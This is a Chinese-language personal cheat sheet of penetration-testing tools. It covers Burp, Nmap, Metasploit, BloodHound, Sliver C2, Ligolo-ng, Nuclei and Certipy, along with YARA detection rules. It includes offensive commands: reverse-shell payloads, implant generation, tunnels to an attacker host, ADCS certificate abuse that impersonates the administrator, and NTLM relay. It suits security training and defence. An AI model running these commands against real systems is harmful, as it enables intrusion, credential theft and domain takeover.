# Tool Notes - 工具使用笔记

_安全虾的工具箱，每个工具的心得都在这里。_

---

## 一、Burp Suite

### 核心功能
- **Proxy:** 拦截和修改 HTTP 请求/响应
- **Intruder:** 自动化攻击（暴力破解、参数 fuzz）
- **Repeater:** 手工重放和测试请求
- **Scanner:** 自动化漏洞扫描（Pro 版）
- **Sequencer:** 随机性分析（Session token 等）

### 实战技巧
- **自动替换：** Proxy → Options → Match and Replace（自动替换头、参数）
- **Intruder Payload 位置：** 用 `§` 标记多个位置，支持 pitchfork/cluster bomb 攻击模式
- **宏录制：** 自动处理 CSRF token、登录刷新
- **扩展推荐：**
  - HackBar — 快速编码/解码
  - Logger++ — 增强日志
  - Autorize — 权限测试自动化
  - JSON Beautifier — JSON 格式化
  - Turbo Intruder — 高并发 Intruder
- **Bypass WAF：** 使用chunked编码、分块传输绕过

### 热键
- `Ctrl+R` → 发送到 Repeater
- `Ctrl+I` → 发送到 Intruder
- `Ctrl+Shift+D` → 发送到 Decoder

---

## 二、Nmap

### 常用扫描模式
```bash
# 快速端口发现
nmap -sS -T4 -F --top-ports 1000 <target>

# 全端口扫描
nmap -sS -p- -T4 <target>

# 服务版本检测
nmap -sV -sC -O <target>

# UDP 扫描（慢但必要）
nmap -sU --top-ports 20 <target>

# 脚本扫描
nmap --script vuln <target>
nmap --script "smb-*" -p 445 <target>
```

### NSE 脚本分类
- **auth:** 认证绕过检测
- **broadcast:** 局域网发现
- **brute:** 暴力破解
- **default:** 默认脚本
- **discovery:** 信息收集
- **dos:** 拒绝服务（⚠️ 需授权）
- **exploit:** 漏洞利用（⚠️ 需授权）
- **external:** 外部查询
- **fuzzer:** 模糊测试
- **intrusive:** 入侵性检测
- **malware:** 恶意软件检测
- **safe:** 安全脚本
- **version:** 版本检测
- **vuln:** 漏洞检测

### 实用技巧
- `-T4` 日常够用，`-T5` 容易触发 IDS
- `--min-rate 1000` 保证扫描速度
- `-Pn` 跳过主机发现（防 ICMP 过滤）
- `--reason` 显示端口状态判断依据
- `-oA` 同时输出三种格式（nmap/grepable/xml）

---

## 三、Metasploit Framework

### 基本工作流
```bash
msfconsole
search <关键词>
use <exploit/module>
show options
set RHOSTS <target>
set LHOST <attacker>
exploit
```

### Meterpreter 常用命令
```
sysinfo                    # 系统信息
getuid                     # 当前用户
hashdump                   # 密码 hash
ps                         # 进程列表
migrate <pid>              # 迁移进程
download <file>            # 下载文件
upload <file>              # 上传文件
shell                      # 获取系统 shell
background                 # 后台运行会话
```

### Payload 选择
- `windows/x64/meterpreter/reverse_tcp` — 常见反弹 shell
- `windows/x64/meterpreter/reverse_https` — HTTPS 加密
- `java/jsp_shell_reverse_tcp` — Java Web Shell
- `python/meterpreter/reverse_tcp` — Python 反弹

---

## 四、BloodHound

### 数据收集
```bash
# SharpHound（推荐，C# 版）
SharpHound.exe -c All --zip

# PowerShell 版
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
```

### 关键 Cypher 查询
```cypher
// 查找到 Domain Admin 的最短路径
MATCH p=shortestPath((n:User {name:'DOMAIN\\user'})-[*1..]->(g:Group {name:'DOMAIN\\Domain Admins'}))
RETURN p

// 查找所有 Kerberoastable 用户
MATCH (u:User {hasspna:true}) RETURN u.name, u.serviceprincipalnames

// 查找 AS-REP Roastable 用户
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## 五、IDA Pro / Ghidra

### IDA Pro 快捷键
- `G` → 跳转到地址
- `X` → 交叉引用
- `F5` → 反编译（Hex-Rays）
- `N` → 重命名
- `;` → 添加注释
- `Space` → 图表视图切换

### Ghidra 基本流程
1. 导入二进制文件
2. 自动分析（Auto Analysis）
3. 函数列表 → 找 main/关键函数
4. 反编译器窗口查看伪代码
5. 重命名函数和变量
6. 导出分析结果

### 分析技巧
- **字符串搜索：** 找提示信息、URL、错误消息
- **导入表分析：** API 调用推断功能
- **交叉引用：** 追踪数据流和调用链
- **补丁对比：** 新旧版本 diff 找漏洞修复点

---

## 六、Sliver C2

### 基本用法
```bash
# 生成 implant
sliver> generate --mtls <IP> --os windows --arch amd64 --save /tmp/implant.exe

# 监听
sliver> mtls --lport 8443

# 交互式会话
sliver> sessions
sliver> use <session-id>

# 常用命令
sliver> ls
sliver> cd C:\\Users
sliver> download <file>
sliver> upload <file>
sliver> exec <command>
sliver> shell
```

### 高级功能
- **WASM 支持：** 生成 WebAssembly implant
- **域前置 (Domain Fronting)：** CDN 中转流量
- **DNS 隧道：** C2 over DNS
- **Evasion：** 内存规避、syscall 直接调用
- **Persistence：** 计划任务、服务、注册表

---

## 七、Ligolo-ng

### 快速搭建
```bash
# 代理端（攻击机）
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# 目标端（被控主机）
.\agent.exe -ignore-cert -connect <attacker>:11601

# 在代理端配置 tun 接口
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 添加路由
sudo ip route add 10.10.10.0/24 dev ligolo

# 在 Ligolo 会话中添加代理
session > ifconfig
session > start
```

### 常用命令
```bash
# 查看网络接口
session > ifconfig

# 添加到目标网络的路由
ip route add 10.10.10.0/24 dev ligolo    # Linux
route add 10.10.10.0/24 1                # 通过 session 1 代理

# 在操作系统层面配置 tun 接口（Linux）
ip tuntap add user $(whoami) mode tun ligolo
ip link set ligolo up
ip route add 10.10.10.0/24 dev ligolo
```

### 高级功能
- **端口转发：** listener_add --tcp <local_port>:<remote_addr>:<remote_port>
- **多会话：** 同时连接多个目标，不同子网走不同会话
- **SOCKS5 代理：** 无需配置 tun 接口，直接用 SOCKS5
- **文件传输：** 内置文件上传/下载

### 对比传统工具
| 特性 | Ligolo-ng | Chisel | reGeorg |
|------|-----------|--------|---------|
| 协议 | TCP/UDP | WebSocket | HTTP |
| 子网代理 | ✅ 原生支持 | 需手动配置 | ❌ |
| 多会话 | ✅ | ❌ | ❌ |
| 防火墙绕过 | ✅ (伪装正常流量) | 一般 | 好 |
| 安装 | 单二进制 | 单二进制 | 需要 WebShell |

---

## 八、YARA 规则引擎

### 简介
YARA 是恶意软件模式匹配的"瑞士军刀"——用规则描述恶意软件特征，然后对文件/内存/流量做匹配。防病毒引擎、威胁狩猎、CTF 都用得上。

### 规则结构
```yara
rule RuleName {
    meta:
        author = "SecShrimp"
        description = "检测某种恶意软件"
        date = "2026-05-11"
        severity = "high"
        reference = "https://..."
        mitre_attack = "T1027"  // Obfuscated Files

    strings:
        // 字符串匹配
        $s1 = "malicious_string" ascii wide
        $s2 = "cmd.exe /c" ascii
        
        // 正则匹配
        $r1 = /powershell[- ]{1,5}(-enc|-e|-encodedcommand)/ ascii nocase
        
        // 十六进制匹配（字节序列）
        $h1 = { 4D 5A 90 00 }  // MZ header
        $h2 = { E8 ?? ?? ?? ?? 48 89 }  // call + mov（函数序言）
        
        // 偏移量标记
        $h3 = { 48 89 E5 } at 0  // 函数开头的 push rbp

    condition:
        uint16(0) == 0x5A4D and  // PE 文件
        filesize < 500KB and
        2 of ($s*) and
        $r1
}
```

### 字符串匹配修饰符
| 修饰符 | 含义 | 示例 |
|--------|------|------|
| `ascii` | ASCII 字符串 | `$s1 = "cmd" ascii` |
| `wide` | UTF-16LE 字符串 | `$s1 = "cmd" wide` |
| `nocase` | 不区分大小写 | `$s1 = "CMD" nocase` |
| `fullword` | 全词匹配 | `$s1 = "evil" fullword` |
| `xor` | XOR 编码 | `$s1 = "cmd" xor` |
| `base64` | Base64 编码 | `$s1 = "cmd" base64wide` |
| `in ($str*)` | 限定在字符串集合中 | `$r1 in ($s*)` |
| `at <offset>` | 精确偏移量 | `$s1 at 100` |
| `@ <var>` | 获取匹配位置 | `$s1` @ > 100 |

### 条件表达式
```yara
// 文件类型判断
uint16(0) == 0x5A4D          // PE (MZ)
uint32(0) == 0x464C457F      // ELF (\x7fELF)
uint32(0) == 0xCAFEBABE      // Java class
uint32(0) == 0x504B0304      // ZIP/JAR/Office

// 组合条件
$s1 or $s2                    // 任一匹配
all of them                   // 全部匹配
2 of ($s*, $r1)               // 至少 2 个匹配
any of ($h*)                  // 任一十六进制匹配
none of ($s*)                 // 无匹配

// 文件属性
filesize < 1MB
entrypoint == 0x12345678
number_of_sections > 5
```

### 实战规则模板

**检测 PowerShell 编码执行：**
```yara
rule Suspicious_PowerShell_Encoded {
    meta:
        description = "检测 PowerShell 编码命令执行"
        severity = "high"
        mitre_attack = "T1059.001"
    strings:
        $ps1 = "powershell" ascii nocase
        $ps2 = "pwsh" ascii nocase
        $enc1 = "-enc" ascii nocase
        $enc2 = "-encodedcommand" ascii nocase
        $enc3 = "-e " ascii nocase
        $bypass = "-ExecutionPolicy Bypass" ascii nocase
        $nop = "-nop" ascii nocase
        $win setHidden = "-WindowStyle Hidden" ascii nocase
        $win hidden = "-w hidden" ascii nocase
    condition:
        ($ps1 or $ps2) and
        filesize < 10MB and
        2 of ($enc*, $bypass, $nop, $win*)
}
```

**检测 Metasploit Meterpreter：**
```yara
rule Metasploit_Meterpreter_Stub {
    meta:
        description = "检测 Meterpreter stage payload"
        severity = "critical"
        mitre_attack = "T1059"
    strings:
        $metsrv = "metsrv.dll" ascii
        $stdapi = "stdapi" ascii
        $reverse_tcp = "reverse_tcp" ascii
        $kernel32 = "kernel32.dll" ascii nocase
        $ws2_32 = "ws2_32.dll" ascii nocase
        $virtualalloc = { 68 ?? ?? ?? ?? FF D5 }  // push addr; call eax
    condition:
        $metsrv and
        ($stdapi or $reverse_tcp) and
        ($kernel32 or $ws2_32) and
        filesize < 500KB
}
```

**检测 Cobalt Strike Beacon：**
```yara
rule CobaltStrike_Beacon_Config {
    meta:
        description = "检测 Cobalt Strike Beacon 配置"
        severity = "critical"
        mitre_attack = "T1071"
    strings:
        $beacon_config = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
        $pipe_name = "\\\\.\\pipe\\msagent_" ascii  // 默认管道前缀
        $sleep_mask = { 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 }
    condition:
        $beacon_config or
        ($pipe_name and $sleep_mask)
}
```

### 扫描工具

**命令行扫描：**
```bash
# 扫描单个文件
yara -r rules.yar /path/to/file

# 扫描目录
yara -r rules.yar /malware/samples/

# 输出匹配的文件名
yara -r rules.yar -l findings.txt /samples/

# 结合 YARA Python
pip install yara-python
```

**YARA Python 集成：**
```python
import yara

# 编译规则
rules = yara.compile(filepath='rules/malware.yar')

# 扫描文件
matches = rules.match(file='/path/to/suspicious.exe')
for match in matches:
    print(f"Rule: {match.rule}")
    print(f"Strings: {match.strings}")
    print(f"Tags: {match.tags}")

# 扫描内存中的数据
data = open('sample.exe', 'rb').read()
matches = rules.match(data=data)
```

### 规则编写最佳实践

1. **精确 > 宽泛：** 太宽泛的规则误报多，太精确的漏报多。找平衡。
2. **字符串优先：** 先找唯一字符串，再用条件组合。十六进制匹配成本高。
3. **文件类型过滤：** `uint16(0) == 0x5A4D` 避免对非 PE 文件做无意义匹配。
4. **元数据完整：** 写清楚 description、severity、mitre_attack，方便管理和 SIEM 集成。
5. **测试规则：** 用已知恶意样本和正常文件分别测试，确认 TP 和 FN 在可接受范围。
6. **模块化：** 用 `include` 组织规则文件，通用条件提取为 private rule。

### YARA vs Sigma vs Snort

| 特性 | YARA | Sigma | Snort |
|------|------|-------|-------|
| 目标 | 文件/内存 | 日志/SIEM | 网络流量 |
| 粒度 | 二进制/字符串 | 事件日志 | 网络包 |
| 用途 | 恶意软件检测 | 威胁狩猎 | IDS/IPS |
| 输出 | 匹配规则 | SIEM 查询 | 告警/阻断 |
| 速度 | 文件级快 | 查询级 | 线速 |

---

## 九、其他常用工具

### 信息收集
- **Amass** — 子域名枚举
- **Subfinder** — 被动子域名发现
- **theHarvester** — 邮件/域名收集
- **Shodan/Censys** — 互联网资产搜索

### 漏洞利用
- **Impacket** — Python 网络协议库（psexec, wmiexec, secretsdump...）
- **CrackMapExec** — 内网渗透瑞士军刀
- **Responder** — LLMNR/NBT-NS 毒化 + NTLMv2 抓取
- **mitm6** — IPv6 中间人

### 后渗透
- **Mimikatz** — 凭证提取、票据操作
- **Rubeus** — Kerberos 攻击工具
- **SharpDPAPI** — DPAPI 解密
- **Ligolo-ng** — 隧道代理

### 无线
- **Aircrack-ng** — WiFi 安全审计套件
- **Bettercap** — 中间人攻击框架
- **Wifite2** — 自动化无线攻击

### 取证
- **Volatility** — 内存取证
- **Wireshark** — 网络流量分析
- **Autopsy** — 磁盘取证
- **Redline** — 端点取证分析

---

## 十、Nuclei — 模板化漏洞扫描器

### 简介

Nuclei 是 ProjectDiscovery 开发的基于模板的快速漏洞扫描器。核心优势：
- **模板驱动：** 社区维护 8000+ 检测模板
- **速度极快：** Go 语言编写，并发扫描
- **高度可定制：** YAML 模板语法简单
- **CI/CD 友好：** 可集成到自动化流水线

### 安装
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates  # 更新模板库
```

### 基础用法
```bash
# 扫描单个目标
nuclei -u https://target.com

# 批量扫描（URL 列表）
nuclei -l urls.txt

# 指定严重度过滤
nuclei -u target.com -severity critical,high

# 指定模板
nuclei -u target.com -t cves/
nuclei -u target.com -t http/wordpress/

# 排除低危
nuclei -u target.com -severity critical,high,medium

# JSON 输出
nuclei -u target.com -json -o results.json

# 静默模式（只输出发现的漏洞）
nuclei -u target.com -silent
```

### 高级用法
```bash
# 自定义请求头
nuclei -u target.com -H "Authorization: Bearer xxx"

# 代理
nuclei -u target.com -proxy http://127.0.0.1:8080

# 限速（避免被封）
nuclei -u target.com -rl 50  # 50 请求/秒

# 并发控制
nuclei -u target.com -c 25  # 25 并发

# 模板排除
nuclei -u target.com -exclude-tags dos

# 子域名扫描集成
subfinder -d target.com | nuclei -severity critical,high

# 与 httpx 集成（先探测存活）
httpx -l urls.txt -silent | nuclei -severity critical,high
```

### 编写自定义模板

```yaml
id: custom-sqli-detection

info:
  name: Custom SQL Injection Detection
  author: secshrimp
  severity: high
  description: Detects SQL injection via error-based technique
  reference:
    - https://example.com/sqli-reference
  tags: sqli,web

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'"
      - "{{BaseURL}}/?id=1' OR '1'='1"
      - "{{BaseURL}}/?id=1' AND '1'='2"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "mysql_fetch"
          - "ORA-\d{5}"
          - "PostgreSQL.*ERROR"
          - "SQLite/JDBCDriver"
          - "Microsoft.*ODBC.*SQL Server"
        condition: or

      - type: status
        status:
          - 200
          - 500

    extractors:
      - type: regex
        group: 1
        regex:
          - "ERROR ([^"]+)"
```

### 模板结构说明

```yaml
id: unique-template-id        # 模板唯一 ID
info:
  name: Template Name          # 名称
  author: author               # 作者
  severity: critical|high|medium|low|info
  tags: tag1,tag2              # 标签
  description: ...             # 描述
  reference:                   # 参考链接
    - URL
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89

requests:                      # HTTP 请求
  - method: GET|POST
    path:
      - "{{BaseURL}}/path"
    headers:                   # 自定义头
      Key: Value
    body: ""                   # POST body
    matchers:                  # 匹配条件
      - type: status|word|regex|binary|dsl
        status: [200]
        words: ["keyword"]
        regex: ["pattern"]
        condition: or|and
    extractors:                # 提取信息
      - type: regex|kval|json
```

### 实战扫描策略

```bash
# 1. 快速信息收集
nuclei -u target.com -tags tech,detect,waf-detect

# 2. CVE 扫描
nuclei -u target.com -tags cve -severity critical,high

# 3. 专用扫描
nuclei -u target.com -tags wordpress
nuclei -u target.com -tags apache
nuclei -u target.com -tags iis

# 4. 全面扫描（慎用）
nuclei -u target.com -severity critical,high,medium

# 5. 内网扫描
nuclei -l internal-urls.txt -severity critical,high -proxy http://proxy:8080
```

### 集成与自动化

```bash
# Bug Bounty 流程
subfinder -d target.com -silent > subdomains.txt
httpx -l subdomains.txt -silent > alive.txt
nuclei -l alive.txt -severity critical,high -json -o results.json

# CI/CD 集成（PR 检查）
nuclei -u $DEPLOY_URL -severity critical,high -silent -exit-code 1
# exit-code 1 表示发现漏洞，CI 失败
```

### 最佳实践

1. **先小范围测试：** 新模板先在测试环境验证
2. **限速：** 生产环境扫描设置 `-rl 50` 以下
3. **排除 DoS 模板：** `-exclude-tags dos` 避免影响服务
4. **自定义模板：** 针对业务逻辑编写专用检测
5. **持续更新：** `nuclei -update-templates` 保持模板最新
6. **结果验证：** Nuclei 输出需要人工验证（有误报）
7. **与其他工具配合：** httpx 存活探测 → nuclei 漏洞扫描 → 全链路覆盖

---

## 十一、Certipy — ADCS 攻击与枚举

### 简介

Certipy 是 Python 编写的 ADCS (Active Directory Certificate Services) 攻击工具，是 Certify (C#) 的跨平台替代。用于枚举和利用 ADCS 配置错误。

### 安装
```bash
pip install certipy-ad
```

### 枚举（信息收集）
```bash
# 连接域控枚举所有 ADCS 配置
certipy find -u user@domain.local -p Password1 -dc-ip 10.10.10.1 -vulnerable

# 输出文件：
# - Results.json：所有模板、CA、证书
# - Credentials.txt：发现的凭据

# 只看可利用模板
certipy find -u user@domain.local -p Password1 -dc-ip 10.10.10.1 -vulnerable -enabled
```

### 攻击利用
```bash
# ESC1：用普通用户请求管理员证书
certipy req -u user@domain.local -p Password1 -dc-ip 10.10.10.1 -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.local

# ESC2：请求 CA 证书
certipy req -u user@domain.local -p Password1 -dc-ip 10.10.10.1 -ca CA-NAME -template User -upn administrator@domain.local -subject "CN=administrator"

# 使用导出的证书获取 NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# ESC8：NTLM Relay 到 ADCS HTTP 端点
# 需要配合 ntlmrelayx
ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template VulnerableTemplate
```

### 输出解读
```json
// Results.json 关键字段
{
  "Certificate Templates": {
    "VulnerableTemplate": {
      "Enrollment Permissions": ["domain users"],
      "Vulnerabilities": {
        "ESC1": {
          "Type": "Access Control",
          "Technique": "MISSING_ENROLLEE_SUPPLIES_SUBJECT",
          "Severity": "HIGH"
        }
      }
    }
  }
}
```

### 与其他工具配合
```
BloodHound → 发现 ADCS 攻击路径
    ↓
Certipy find → 枚举可利用模板
    ↓
Certipy req → 请求证书
    ↓
Certipy auth → 证书 → NTLM hash
    ↓
Rubeus/Impacket → 获取 TGT → 横向移动
```

### 最佳实践
1. **先枚举后利用：** `find` 先看清全局，再决定攻击路径
2. **ESC1 优先：** 最简单的利用路径，成功率最高
3. **注意审计日志：** 证书请求会产生 Event ID 4886/4887
4. **NTLM Relay 需要协调：** 需要同时设置中继器和触发 NTLM 认证
5. **跨平台：** Python 编写，Linux/Mac/Windows 均可运行
6. **与 Certify 对比：** Certify 功能更全但需要 Windows/.NET；Certipy 跨平台更灵活

---

_工具是死的，虾是活的。_
